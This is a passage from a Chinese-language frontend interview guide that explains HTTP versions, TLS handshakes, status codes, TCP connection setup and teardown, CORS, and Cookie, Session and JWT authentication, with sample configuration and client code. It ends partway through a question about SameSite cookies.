## 一、HTTP 版本对比

### Q: HTTP 1.0、1.1、2.0、3.0 的区别是什么？

**难度**：⭐⭐⭐⭐ | **频率**：🔥🔥🔥🔥🔥

**答：**

| 版本 | 关键特性 | 主要问题 |
|---|---|---|
| **HTTP/1.0** | 短连接（每次请求新建TCP） | 连接复用差，慢 |
| **HTTP/1.1** | 持久连接（Keep-Alive）、管道化、Host头 | **队头阻塞**（HOL Blocking）、头部重复 |
| **HTTP/2** | **多路复用**、头部压缩（HPACK）、服务端推送、二进制帧 | TCP 层队头阻塞（丢包时全部等待）|
| **HTTP/3** | 基于 **QUIC**（UDP），彻底解决队头阻塞、0-RTT连接、连接迁移 | 普及率低，部分网络设备阻断UDP |

**HTTP/1.1 的队头阻塞：**
虽然支持管道化（多个请求不等响应直接发），但服务器必须按顺序响应，前一个卡住会阻塞后面的。

**HTTP/2 多路复用：**
```
HTTP/1.1：
Request 1 ──────────────────────
Request 2          ─────────────  (必须等 1 的响应)

HTTP/2：
Stream 1: ── req ──────── resp ──
Stream 2: ──── req ── resp ──────  (同一TCP连接，并发流)
Stream 3: ────── req ──── resp ──
```

**HTTP/2 的问题 & HTTP/3 的解法：**
- HTTP/2 底层仍是 TCP，TCP 丢包时所有 stream 都要等重传 → HTTP/3 用 QUIC（UDP），stream 间互不影响

---

**🔍 深层原理**

**HTTP/1.0 → 1.1：Hold-Alive 解决了什么？**

HTTP/1.0 每次请求都要经历：TCP 三次握手 → 发数据 → 四次挥手。一个页面有 30 个资源，就要建立 30 次连接，`3 RTT × 30 = 90 RTT` 的纯握手开销。

HTTP/1.1 引入持久连接（`Connection: keep-alive`），同一 TCP 连接可以复用，大幅减少握手开销。但问题是**管道化**（Pipelining）虽然允许批量发请求，但响应必须按序返回——这就是**应用层的队头阻塞**。

**HTTP/2 多路复用的帧机制：**

HTTP/2 把通信拆分成**帧（Frame）**，每个帧属于某个**流（Stream）**，帧可以乱序传输，接收方按 Stream ID 重组。这是真正的并发，而不是 HTTP/1.1 假并发（开多个 TCP 连接）。

```
TCP 连接
│
├── Frame(Stream 1, HEADERS)
├── Frame(Stream 2, HEADERS)
├── Frame(Stream 1, DATA)   ← Stream 1 和 2 交替传输
├── Frame(Stream 3, HEADERS)
├── Frame(Stream 2, DATA)
└── ...
```

**为什么 HTTP/2 还有 TCP 队头阻塞？**

TCP 保证数据有序可靠到达。当网络丢包时，TCP 会暂停所有数据交付，等待丢失包的重传——即使其他 Stream 的数据已经到达。这是**传输层的队头阻塞**，应用层无能为力。

**QUIC 如何解决？**

QUIC 在 UDP 之上实现了 Stream 的独立传输，每个 Stream 独立管理重传，一个 Stream 丢包不影响其他 Stream。同时 QUIC 内置 TLS 1.3，0-RTT 连接建立时间极短。

```
QUIC 丢包处理：
Stream 1: A B C [丢] E F   ← 只有 Stream 1 等待 D 重传
Stream 2: X Y Z            ← Stream 2 不受影响，继续传输
```

**HPACK 头部压缩原理：**

HTTP/1.x 每次请求都要携带大量重复头（User-Agent、Cookie 等）。HTTP/2 的 HPACK 维护一个**静态表**（常用头字段的编码表）和**动态表**（本次连接中出现过的头字段），用索引代替重复字符串，首次传输后后续只需发索引号。

---

**⚠️ 常见误区**

1. **误以为 HTTP/2 就是"多个 TCP 连接"**：错，HTTP/2 是单一 TCP 连接上的多路复用。浏览器对同一域名只建一个 HTTP/2 连接。

2. **误以为开启 HTTP/2 后 HTTP/1.1 的域名分片优化仍有效**：HTTP/1.1 时代为了突破每个域名 6 个连接的限制，会分多个域名（域名分片），但 HTTP/2 下这反而会破坏多路复用，应该合并域名。

3. **误以为 HTTP/3 = HTTP/2 + QUIC**：HTTP/3 是全新协议，不是在 HTTP/2 上打补丁，两者帧格式也不同。

4. **误以为 HTTPS 只有 HTTP/1.1 才需要**：HTTPS 和 HTTP 版本无关，HTTP/2 规范要求必须基于 TLS（虽然 h2c 明文版存在，但浏览器不支持）。

---

**💡 踩坑点**

- Nginx 默认 HTTP/2 只用于 HTTPS，配置 `listen 443 ssl http2;`，不要忘记 ssl 关键字
- Node.js `http2` 模块和 `http` 模块 API 不同，迁移时注意
- Webpack/Vite 的 `splitChunks` 在 HTTP/2 下可以更激进地拆分 chunk（利用多路复用），但在 HTTP/1.1 下拆太多反而更慢

---

**🎯 面试追问**

**Q1：HTTP/2 的多路复用和 HTTP/1.1 的 Keep-Alive 有什么本质区别？**

> Keep-Alive 保持 TCP 连接但请求仍然串行（或管道化后仍有序响应）；多路复用是真正的并行——多个请求/响应在同一连接中同时传输，互不依赖顺序。

**Q2：为什么浏览器对 HTTP/1.1 同一域名限制 6 个并发连接？**

> 防止单个客户端占用服务器过多资源（DoS 防护）；同时 6 个已足够覆盖大多数页面场景。这个数字是 TCP RFC 建议和浏览器厂商权衡的结果。

**Q3：QUIC 基于 UDP，如何保证可靠性？**

> QUIC 在应用层实现了可靠传输：序列号、ACK 确认、拥塞控制、流量控制——所有 TCP 的可靠机制都在 QUIC 的用户态实现，而不依赖操作系统 TCP 栈。好处是可以快速迭代优化，无需等待系统更新。

### Q: HTTPS 的工作原理？TLS 握手过程？

**难度**：⭐⭐⭐⭐ | **频率**：🔥🔥🔥🔥

**答：**

HTTPS = HTTP + **TLS（Transport Layer Security）**，在传输层加密。

**TLS 1.2 握手（4次 RTT）：**
```
Client                    Server
  │──── ClientHello ──────▶│  支持的 TLS 版本、cipher suite、随机数 Client Random
  │◀─── ServerHello ───────│  选定 cipher、随机数 Server Random
  │◀─── Certificate ───────│  服务器证书（含公钥）
  │◀─── ServerHelloDone ───│
  │──── ClientKeyExchange ▶│  用公钥加密 Pre-Master Secret
  │──── ChangeCipherSpec ──▶│
  │──── Finished ──────────▶│  用会话密钥加密，验证握手
  │◀─── ChangeCipherSpec ───│
  │◀─── Finished ───────────│  握手完成
  │══════ 加密通信 ══════════│
```

**会话密钥生成：**
`Client Random + Server Random + Pre-Master Secret → 通过 PRF 生成对称密钥`

**TLS 1.3 改进：**
- 握手从 **2-RTT 减少到 1-RTT**
- 支持 **0-RTT**（复用之前的会话，但有重放攻击风险）
- 删除弱加密算法（RSA 密钥交换、RC4 等）

---

**🔍 深层原理**

**为什么要同时用非对称加密和对称加密？**

- **非对称加密（RSA/ECDHE）**：安全性高，但计算慢（比对称慢 100-1000 倍），只用于握手阶段交换密钥
- **对称加密（AES）**：速度快，但密钥分发困难（双方如何安全共享密钥？）

TLS 结合两者优点：用非对称加密安全地协商出一个对称密钥，然后用对称加密加密实际数据。

**TLS 1.2 完整握手时序图（含 RTT 标注）：**
```
客户端                                    服务端
   │                                        │
   │─── ClientHello ──────────────────────▶ │  ← RTT 1 开始
   │◀── ServerHello + Certificate ──────── │  ← RTT 1 结束
   │    ServerKeyExchange (ECDHE)           │
   │    ServerHelloDone                     │
   │                                        │
   │─── ClientKeyExchange ───────────────▶ │  ← RTT 2 开始
   │    ChangeCipherSpec                    │
   │    Finished (加密验证)                  │
   │◀── ChangeCipherSpec ─────────────────  │  ← RTT 2 结束
   │    Finished (加密验证)                  │
   │                                        │
   │══════════ 加密 HTTP 数据 ══════════════ │  ← RTT 3+（实际请求）
```

**TLS 1.3 的 1-RTT 握手：**

TLS 1.3 客户端在 ClientHello 中就携带了密钥协商参数（key_share），服务端可以立即在 ServerHello 中完成密钥协商，省去了一次往返。

```
客户端                              服务端
   │                                   │
   │─── ClientHello + key_share ─────▶ │  ← RTT 1 开始
   │◀── ServerHello + key_share ────── │
   │    Certificate + CertVerify        │
   │    Finished                        │  ← RTT 1 结束（服务端已完成）
   │─── Finished ──────────────────── ▶│
   │═══════════ 加密数据 ══════════════ │  ← 立即发送
```

**证书验证过程：**

浏览器收到服务器证书后，会执行：
1. 检查证书是否由受信任 CA 签发（证书链验证）
2. 检查证书是否在有效期内
3. 检查证书域名是否匹配（防止中间人攻击）
4. 检查 CRL/OCSP 确认证书未被吊销

```
证书链：
网站证书 (example.com)
    └─ 由中间 CA 签名
         └─ 由根 CA 签名
              └─ 预装在操作系统/浏览器中（信任锚）
```

**ECDHE vs RSA 密钥交换的区别：**

- **RSA 密钥交换**：客户端用服务器公钥加密 Pre-Master Secret 发给服务器。缺陷：若私钥泄露，历史流量可被解密（无前向安全性）
- **ECDHE（椭圆曲线 Diffie-Hellman 临时密钥）**：双方各自生成临时密钥对，通过 DH 算法协商出共享密钥。每次握手密钥不同，即使私钥泄露，历史流量也无法解密（**前向安全性**）

---

**⚠️ 常见误区**

1. **误认为 HTTPS 完全防止中间人攻击**：HTTPS 本身防中间人，但如果用户被诱导安装了恶意根证书（如企业内网代理），中间人仍可解密。

2. **混淆 SSL 和 TLS**：SSL 是老版本（SSL 3.0 已被弃用，存在严重漏洞 POODLE），TLS 是其继任者。现在说"SSL证书"其实是 TLS 证书，TLS 1.0/1.1 也已不安全，应使用 TLS 1.2+。

3. **误以为 0-RTT 是完全安全的**：0-RTT 存在**重放攻击**风险，攻击者可以重放客户端发送的早期数据。因此 0-RTT 只适合幂等请求（GET），不适合有副作用的操作（POST 支付等）。

---

**💡 踩坑点**

- 证书续期别用 `Expires` 判断，用 `openssl x509 -noout -dates -in cert.pem` 检查
- 自签名证书在本地开发可用，但浏览器会警告；用 `mkcert` 生成本地信任证书更方便
- HSTS（HTTP Strict Transport Security）一旦设置 `max-age` 过大，想改回 HTTP 会很麻烦，建议先用小值测试

---

**🎯 面试追问**

**Q1：TLS 握手中的随机数（Client Random + Server Random）有什么作用？**

> 引入两个随机数是为了防止"重放攻击"——即使攻击者录制了完整握手过程，由于每次随机数不同，生成的会话密钥也不同，无法复用历史会话。两个随机数来自双方，确保即使一方随机数不够随机，另一方也提供了熵。

**Q2：为什么需要证书，用公钥加密不就够了吗？**

> 公钥加密解决数据机密性，但无法证明"这个公钥确实属于 example.com"。没有证书体系，攻击者可以发布自己的公钥冒充 example.com（中间人攻击）。证书由受信任的 CA 对"域名+公钥"进行数字签名，浏览器验证签名来确认身份。

**Q3：什么是 SNI（Server Name Indication）？为什么需要它？**

> 一台服务器可能托管多个域名（虚拟主机），每个域名有不同证书。但 TLS 握手在 HTTP 请求之前，服务器还不知道客户端想访问哪个域名，无法选择正确证书。SNI 是 TLS 扩展，客户端在 ClientHello 中明文携带目标域名，服务器据此选择证书。注意：SNI 是明文传输的，ISP 可以看到你访问的域名（ECH/ESNI 是加密 SNI 的新标准）。

### Q: HTTP 常用状态码有哪些？

**难度**：⭐⭐ | **频率**：🔥🔥🔥🔥

**答：**

| 状态码 | 含义 | 常见场景 |
|---|---|---|
| **200** | OK | 请求成功 |
| **201** | Created | POST 创建资源成功 |
| **204** | No Content | DELETE 成功，无响应体 |
| **301** | Moved Permanently | 永久重定向（换域名） |
| **302** | Found | 临时重定向（登录跳转） |
| **304** | Not Modified | 协商缓存命中 |
| **400** | Bad Request | 请求参数错误 |
| **401** | Unauthorized | 未认证（需登录） |
| **403** | Forbidden | 已认证但无权限 |
| **404** | Not Found | 资源不存在 |
| **405** | Method Not Allowed | 方法不被允许 |
| **422** | Unprocessable Entity | 参数校验失败（REST API） |
| **429** | Too Many Requests | 限流 |
| **500** | Internal Server Error | 服务器内部错误 |
| **502** | Bad Gateway | 上游服务器无响应 |
| **503** | Service Unavailable | 服务不可用（过载/维护）|

---

**🔍 深层原理**

**301 vs 302 的本质区别（SEO 和缓存视角）：**

- **301 永久重定向**：浏览器会缓存这个重定向，下次访问直接跳转不再请求原 URL；搜索引擎会将原 URL 的权重转移到新 URL。适合：域名迁移、URL 规范化（http → https）。
- **302 临时重定向**：浏览器不缓存，每次都请求原 URL；搜索引擎保留原 URL 权重。适合：A/B 测试、登录跳转、维护页面。

**301/302 引发的安全问题：**

POST 请求跟随 301/302 重定向时，**旧版浏览器**会将方法改为 GET（丢失请求体）。为此 HTTP 引入了：
- **303 See Other**：明确告知客户端用 GET 方法重定向（POST → GET）
- **307 Temporary Redirect**：临时重定向，但保持原 HTTP 方法（POST 仍然 POST）
- **308 Permanent Redirect**：永久重定向，保持原 HTTP 方法

```
总结：
301/302 → 浏览器可能改 POST 为 GET（历史行为）
307/308 → 严格保持原方法
303     → 强制改为 GET
```

**401 vs 403 的语义区别：**
- **401 Unauthorized**：实际是"未认证"——你是谁我不知道，请先登录
- **403 Forbidden**：我知道你是谁，但你没有权限——已登录但权限不足

**5xx 错误分析：**
```
500 → 服务器内部错误（bug，查日志）
501 → 服务器不支持该功能（如不支持某 HTTP 方法）
502 → 网关/代理收到上游无效响应（Nginx 无法连接后端 Node.js）
503 → 服务器暂时不可用（过载或维护）
504 → 网关超时（上游响应超时）
```

---

**⚠️ 常见误区**

1. **误用 200 表示业务失败**：很多项目用 `{code: 0/1, msg: "xxx"}` + HTTP 200 表示业务错误，这不符合 REST 语义。REST API 应该用适当 HTTP 状态码（400/404/422 等）。

2. **204 响应体必须为空**：204 No Content 不允许有响应体，如果服务端强行返回 body，客户端会忽略它。

3. **304 不代表资源不存在**：304 是协商缓存命中，表示资源未改变，客户端应使用本地缓存，而不是"没找到"。

4. **混淆 401 和 403**：后端鉴权中间件要区分"未登录"（401）和"已登录但无权限"（403），前端处理逻辑不同（401 跳登录页，403 提示无权限）。

---

**💡 踩坑点**

```js
// 前端根据状态码做不同处理
axios.interceptors.response.use(
  (response) => response,
  (error) => {
    const status = error.response?.status;
    
    if (status === 401) {
      // 未登录：清除 token，跳转登录页
      store.dispatch('logout');
      router.push('/login');
    } else if (status === 403) {
      // 无权限：提示用户，不跳转登录
      message.error('您没有权限执行此操作');
    } else if (status === 429) {
      // 限流：提示稍后重试，可加指数退避重试
      message.warning('操作太频繁，请稍后再试');
    } else if (status >= 500) {
      // 服务器错误：上报监控
      reportError(error);
      message.error('服务器开小差了，请稍后重试');
    }
    
    return Promise.reject(error);
  }
);
```

---

**🎯 面试追问**

**Q1：跨域预检请求（OPTIONS）成功后返回什么状态码？**

> 通常返回 **204 No Content** 或 200，表示允许跨域。响应体为空，携带 `Access-Control-Allow-*` 响应头。

**Q2：如果 API 要删除一个不存在的资源，应该返回 404 还是 204？**

> 有两种合理设计：返回 **404**（语义明确，资源不存在）或返回 **204**（幂等性视角：删除的目的达到了——该资源确实不存在了）。REST 规范倾向于 404，但实际项目中 204 也常见。重要的是团队保持一致。

**Q3：102 和 103 状态码是做什么的？**

> **102 Processing**（WebDAV）：服务器已收到请求但处理未完成，防止客户端超时。**103 Early Hints**：服务器在完整响应前提前发送 `Link` 预加载头，让浏览器提前开始加载关键资源，是 HTTP/2 Server Push 的现代替代方案。

## 二、TCP

### Q: TCP 三次握手和四次挥手的过程？为什么是三次/四次？

**难度**：⭐⭐⭐⭐ | **频率**：🔥🔥🔥🔥🔥

**答：**

**三次握手（建立连接）：**
```
客户端(C)              服务端(S)
    │──── SYN(seq=x) ──────▶│  C → S：我要连接
    │◀─── SYN+ACK(seq=y,ack=x+1)│  S → C：收到，我也要连接
    │──── ACK(ack=y+1) ────▶│  C → S：收到，连接建立
    │══════ 数据传输 ═════════│
```

**为什么是三次？**
- **两次握手**：服务器无法确认客户端收到了自己的 SYN+ACK（历史失效连接可能骚扰服务器）
- **三次**：双方都能确认对方的发送和接收能力正常

**四次挥手（断开连接）：**
```
客户端(C)              服务端(S)
    │──── FIN ─────────────▶│  C：我不发数据了
    │◀─── ACK ───────────────│  S：收到，等我发完
    │◀─── FIN ───────────────│  S：我也发完了
    │──── ACK ─────────────▶│  C：收到，等 2MSL 后关闭
    │  [2MSL 等待]           │
```

**为什么是四次？**
TCP 是全双工的，关闭连接需要双方各自发送 FIN。服务端收到 FIN 后还可能有数据要发，ACK 和 FIN 不能合并，所以是四次。

**TIME_WAIT（等待 2MSL）的原因：**
1. 确保 ACK 到达服务端（若丢失，等待服务端重发 FIN）
2. 防止旧连接的数据包影响新连接

---

**🔍 深层原理**

**三次握手的状态机全景：**
```
客户端状态                        服务端状态
CLOSED                            CLOSED
   │                                 │
   │ (应用调用 connect)              │ (应用调用 listen)
   ▼                                 ▼
SYN_SENT ──── SYN ─────────────▶ LISTEN
   │                                 │
   │                                 ▼ (收到 SYN)
   │                             SYN_RECEIVED
   │                                 │
   │ ◀─────────── SYN+ACK ─────────  │
   ▼ (收到 SYN+ACK)                  │
ESTABLISHED                          │
   │ ──────────── ACK ─────────────▶ │
   │                                 ▼ (收到 ACK)
   │                             ESTABLISHED
   │══════════ 数据传输 ════════════  │
```

**为什么两次握手不够——历史连接问题：**

假设网络中存在一个**迟到的 SYN 包**（之前因网络拥塞被延迟）：
- 两次握手：服务器收到迟到 SYN，认为是新连接，回复 SYN+ACK，进入 ESTABLISHED 状态，分配资源等待数据——但客户端已不再理会，服务器资源被白白占用
- 三次握手：服务器回复 SYN+ACK，等待客户端 ACK。客户端不理会（没发起这个连接），不回复 ACK，服务器等待超时后释放，不会建立无效连接

**四次挥手的状态机：**
```
客户端状态                            服务端状态
ESTABLISHED ──── FIN ──────────────▶ ESTABLISHED
FIN_WAIT_1                            │
   │                                  ▼ (收到 FIN)
   │  ◀──────────── ACK ──────────  CLOSE_WAIT
   ▼ (收到 ACK)                       │
FIN_WAIT_2                            │ (应用发完剩余数据)
   │                                  ▼
   │  ◀──────────── FIN ──────────  LAST_ACK
   ▼TIME_WAIT ──── ACK ──────────────▶ CLOSED
   │
   │ [等待 2MSL]
   ▼
CLOSED
```

**SYN Flood 攻击原理（面试延伸）：**

攻击者发送大量伪造源 IP 的 SYN 包，服务器回复 SYN+ACK 后等待 ACK，但 ACK 永远不来，占满 `SYN_RECEIVED` 队列，合法连接无法建立。

**防护手段：**
- `SYN Cookie`：服务器不保存半连接状态，将信息编码到序列号中，收到 ACK 时验证
- 限制 SYN 速率
- 增大半连接队列

---

**⚠️ 常见误区**

1. **误以为四次挥手是因为"更复杂"**：根本原因是 TCP 全双工，两个方向的关闭必须独立进行，不能省略。

2. **TIME_WAIT 是客户端特有的**：主动关闭方（不一定是客户端，服务器也可以主动关闭）进入 TIME_WAIT。

3. **TIME_WAIT 一定等 2MSL 才释放**：生产环境大量短连接会导致端口耗尽，可通过 `SO_REUSEADDR` 或减小 `tcp_fin_timeout` 缓解。

---

**💡 踩坑点**

- 高并发服务器频繁出现 `TIME_WAIT` 太多导致端口耗尽：用 `netstat -an | grep TIME_WAIT | wc -l` 监控
- 前端 HTTP 请求在 Keep-Alive 下复用 TCP，无需关注握手/挥手；但 WebSocket 断开会触发四次挥手
- 移动端弱网下 `RST` 包（异常关闭）比 `FIN` 更常见，前端需做好断线重连

---

**🎯 面试追问**

**Q1：为什么 TIME_WAIT 等待时间是 2MSL？**

> MSL（Maximum Segment Lifetime）是报文最大存活时间。等待 2MSL 是为了覆盖"客户端发出的 ACK 到达服务端"+ "服务端因 ACK 丢失重发的 FIN 到达客户端"这一来一回的最长时间，确保连接彻底关闭，旧数据包不影响新连接。

**Q2：四次挥手能否变成三次？**

> 可以，当服务端在收到 FIN 后没有数据要发时，可以把 ACK 和 FIN 合并成一个包（三次挥手）。这在实践中确实会发生，但通常因为 TCP 的延迟 ACK 和应用关闭延迟而保持四次。

**Q3：前端 fetch/axios 请求怎么与 TCP 连接复用相关？**

> 浏览器维护一个连接池（per origin）。HTTP/1.1 下同一域名最多 6 个 TCP 连接，Connection: keep-alive 让它们复用，不需要每次请求都重新握手。HTTP/2 下同一域名共享一个 TCP 连接多路复用，Connection 头被废弃。

## 三、跨域 / 安全 / 缓存 / 鉴权专题

### Q: 什么是跨域？CORS 的原理和解决方案？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥🔥🔥

**答：**

跨域是浏览器**同源策略（Same-Origin Policy）**限制的结果。当一个页面发起请求的**协议、域名、端口**三者中有任意一个与当前页面不同，即为跨域。

```
// 同源判断示例（当前页面：http://a.com:80）
http://a.com/api          ✅ 同源
https://a.com/api         ❌ 协议不同（https vs http）
http://b.com/api          ❌ 域名不同
http://a.com:8080/api     ❌ 端口不同
http://sub.a.com/api      ❌ 子域名不同
```

**CORS（Cross-Origin Resource Sharing）原理：**

CORS 是 W3C 标准，通过 HTTP 头控制跨域访问。分为两类请求：

**1. 简单请求**（满足以下所有条件）：
- 方法：GET / POST / HEAD
- 头部仅含：Accept、Content-Type（仅 text/plain、multipart/form-data、application/x-www-form-urlencoded）、Accept-Language 等
- 浏览器自动加 `Origin` 头，服务器返回 `Access-Control-Allow-Origin` 即可

**2. 预检请求（Preflight）**：
不满足简单请求条件时，浏览器先发一个 OPTIONS 请求询问服务器是否允许：
```
OPTIONS /api/users HTTP/1.1
Origin: http://frontend.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Content-Type, Authorization

// 服务器响应
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: http://frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400   // 预检缓存 24h
```

**CORS 相关响应头说明：**
```
Access-Control-Allow-Origin: *          // 允许所有源（或指定域）
Access-Control-Allow-Methods: GET, POST // 允许的方法
Access-Control-Allow-Headers: X-Custom  // 允许的自定义头
Access-Control-Allow-Credentials: true  // 允许携带 Cookie
Access-Control-Expose-Headers: X-Total  // 暴露给 JS 的响应头
Access-Control-Max-Age: 3600            // 预检结果缓存时间
```

**常见解决跨域方案：**

```js
// 1. 后端设置 CORS 响应头（最推荐）
// Express 示例：
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://frontend.com');
  res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') return res.status(204).end();
  next();
});

// 2. Nginx 反向代理（前端不跨域，Nginx 做转发）
// nginx.conf:
// location /api/ {
//   proxy_pass http://backend-server:3000/;
//   proxy_set_header Host $host;
// }

// 3. Vite/Webpack DevServer 代理（仅开发环境）
// vite.config.ts:
export default {
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:3000',
        changeOrigin: true,    // 修改请求头中的 Host
        rewrite: (path) => path.replace(/^\/api/, '')
      }
    }
  }
}

// 4. JSONP（仅 GET，已过时）
function jsonp(url, callback) {
  const fn = 'jsonp_' + Date.now();
  window[fn] = (data) => { callback(data); delete window[fn]; };
  const script = document.createElement('script');
  script.src = `${url}?callback=${fn}`;
  document.body.appendChild(script);
}
```

---

**🔍 深层原理**

**为什么浏览器要有同源策略？**

假设没有同源策略：你登录了 `bank.com`，Cookie 里有 session token。此时你访问了恶意网站 `evil.com`，里面的 JS 可以向 `bank.com/transfer` 发请求，并自动携带你的 Cookie，完成转账攻击。同源策略让 JS 只能操作同源的数据。

**`Access-Control-Allow-Origin: *` 与 Credentials 的冲突：**

当请求携带凭证（Cookie/Authorization）时，`Allow-Origin` 不能设置 `*`，必须指定具体域名，且需要同时设置 `Access-Control-Allow-Credentials: true`。否则浏览器会屏蔽响应。

```js
// ❌ 携带 Cookie 时这样写会被浏览器拦截
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

// ✅ 正确写法
Access-Control-Allow-Origin: https://specific-origin.com
Access-Control-Allow-Credentials: true

// 前端也需要设置
fetch('/api', { credentials: 'include' })      // 携带 Cookie
axios.defaults.withCredentials = true           // axios 全局
```

**Preflight 缓存机制：**

`Access-Control-Max-Age` 让浏览器缓存预检结果，避免每次都发 OPTIONS。但不同浏览器有上限（Chrome 最大 7200 秒，Firefox 86400 秒）。

---

**⚠️ 常见误区**

1. ❌ **跨域是服务器限制**：不对，跨域是**浏览器**的安全策略。服务器实际上收到了请求（能看到日志），只是浏览器拦截了响应。Postman 不受跨域限制就是这个原因。
2. ❌ **CORS 是前端设置的**：CORS 头必须由**后端服务器**设置，前端无权修改响应头。
3. ❌ **设置 `withCredentials: true` 就能携带 Cookie**：还需要后端配合设置 `Access-Control-Allow-Credentials: true` 且 `Allow-Origin` 非 `*`。
4. ✅ **图片/script/link 标签默认不受同源策略限制**（但 JS 读取其内容受限）。

---

**💡 踩坑点**

- 联调时后端配了 CORS 但还是跨域报错，检查：请求的 `Origin` 是否在白名单、`OPTIONS` 预检是否也配了、`Allow-Credentials` 和 `Allow-Origin: *` 是否冲突
- 生产环境不要使用 `*` 作为 `Allow-Origin`，会有 CSRF 风险
- `Access-Control-Expose-Headers` 没配的话，前端 JS 读不到自定义响应头（如分页总数 `X-Total-Count`）

---

**🎯 面试追问**

**Q1：简单请求和非简单请求的区别？预检请求什么时候触发？**

> 简单请求满足：方法为 GET/POST/HEAD，且 Content-Type 仅为三种 form 类型之一，且没有自定义头。不满足以上任一条件就会触发预检（OPTIONS）。例如 `Content-Type: application/json` 或自定义 `Authorization` 头都会触发预检。

**Q2：如何让一个 API 同时支持多个跨域来源？**

> 不能在响应头中放多个 `Access-Control-Allow-Origin`，正确做法是在后端动态读取请求的 `Origin` 头，判断是否在白名单内，若是则将该 `Origin` 原样写回响应头。

**Q3：CORS 和 CSRF 攻击的关系？CORS 能防 CSRF 吗？**

> CORS 不能完全防 CSRF。CORS 只限制跨域 JS 读取响应数据，但简单请求（如表单 POST）本身仍然能到达服务器执行。防 CSRF 需要 CSRF Token 或 SameSite Cookie。

### Q: Cookie、Session、JWT、Token 的区别和应用场景？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥🔥🔥

**答：**

**本质区别：**

| 机制 | 存储位置 | 有无状态 | 适合场景 |
|---|---|---|---|
| Cookie | 客户端浏览器 | - | 存储少量数据，随请求自动发送 |
| Session | 服务端内存/Redis | **有状态** | 传统 Web，用户登录 |
| JWT | 客户端（localStorage / Cookie） | **无状态** | 分布式系统、跨服务鉴权 |
| Token | 客户端 | 看实现 | 通用访问令牌（JWT 是 Token 的一种实现） |

**Cookie / Session 登录流程：**
```
1. 用户登录 → 服务端验证 → 生成 SessionID → 存入 Redis
2. 响应头: Set-Cookie: sessionId=abc123; HttpOnly; Secure
3. 浏览器保存 Cookie，后续请求自动携带
4. 服务端收到请求 → 从 Cookie 读 sessionId → 查 Redis → 得到用户信息
```

**JWT 结构与登录流程：**
```
JWT = Header.Payload.Signature
  Header:    {"alg": "HS256", "typ": "JWT"}
  Payload:   {"userId": 1, "role": "admin", "exp": 1700000000}
  Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)

1. 用户登录 → 服务端验证 → 生成 JWT → 返回给客户端
2. 客户端存储 JWT（localStorage 或 Cookie）
3. 后续请求: Authorization: Bearer <jwt>
4. 服务端验证 JWT 签名和过期时间 → 直接解码获取用户信息（无需查库）
```

```js
// JWT 前端使用示例
// 登录后存储
localStorage.setItem('token', jwt);

// 请求拦截器添加 Authorization
axios.interceptors.request.use(config => {
  const token = localStorage.getItem('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// 解码 JWT Payload（不验证签名，仅查看内容）
function parseJwt(token) {
  const base64 = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
  return JSON.parse(atob(base64));
}

// 检查 JWT 是否过期
function isTokenExpired(token) {
  const { exp } = parseJwt(token);
  return Date.now() >= exp * 1000;
}
```

---

**🔍 深层原理**

**为什么 JWT 无法主动注销（失效）？**

JWT 的验证不需要查数据库，服务端只验证签名和过期时间。这意味着：**即使用户"注销"了，Token 在过期前依然有效**。

**解决方案：**
```js
// 方案1：短生命周期 + Refresh Token 双 Token 机制
// access_token: 15 分钟过期（减少泄露风险）
// refresh_token: 7 天过期，存 HttpOnly Cookie

// 方案2：Token 黑名单（破坏无状态，但可接受）
// Redis 存储已注销的 token，每次验证时查黑名单
const blacklist = new Set();
function logout(token) {
  blacklist.add(token); // 加入黑名单
}
function verify(token) {
  if (blacklist.has(token)) throw new Error('Token revoked');
  // ...正常验证
}

// 方案3：在 Payload 中存版本号，数据库记录当前有效版本
// { userId: 1, tokenVersion: 3 }
// 注销时 DB 中 tokenVersion++，验证时比对版本
```

**Session vs JWT 的选型依据：**
- **Session 优点**：可以即时注销、服务端可控；**缺点**：需要 Redis 等存储，横向扩展需要 Session 共享
- **JWT 优点**：无状态，天然支持分布式（微服务间传递用户信息不需要查库）；**缺点**：无法即时注销、Payload 可解码（不存敏感信息）

**Cookie 安全属性：**
```
Set-Cookie: token=xxx;
  HttpOnly;    // JS 无法读取（防 XSS 窃取 Cookie）
  Secure;      // 只在 HTTPS 传输（防中间人）
  SameSite=Strict; // 跨站请求不发送 Cookie（防 CSRF）
  Path=/;
  Max-Age=3600
```

---

**⚠️ 常见误区**

1. ❌ **JWT 是加密的，数据安全**：JWT 的 Payload 只是 Base64 编码，不是加密，任何人都能解码查看内容！不要存密码等敏感信息。
2. ❌ **把 JWT 存在 localStorage 比 Cookie 安全**：localStorage 更容易被 XSS 攻击窃取；Cookie 设置 HttpOnly 后 JS 无法读取，反而更安全。
3. ✅ **Session 和 Cookie 不是同一个东西**：Cookie 是浏览器存储机制，Session 是服务端状态管理，SessionID 通常通过 Cookie 传输。
4. ❌ **JWT 一定比 Session 好**：要根据场景选择。传统单体应用用 Session 更简单可控；分布式微服务用 JWT 更合适。

---

**💡 踩坑点**

- JWT 的 `exp` 字段是秒级时间戳，前端判断时记得 `exp * 1000` 转毫秒
- Refresh Token 必须存 HttpOnly Cookie 而非 localStorage，否则 XSS 能直接续期
- SameSite=Strict 会导致从第三方链接跳转时 Cookie 不携带（如从邮件链接跳入），可考虑 `SameSite=Lax`

---

**🎯 面试追问**

**Q1：如何实现 JWT 的无感刷新（Token 自动续期）？**

> access_token 快过期时，前端响应拦截器检测到 401 后，自动用 refresh_token 请求新的 access_token，然后重放原失败请求。并发多请求时，只让第一个请求去刷新，其他请求排队等待刷新完成。

**Q2：Cookie 的 SameSite 有哪几种值，各自有什么影响？**

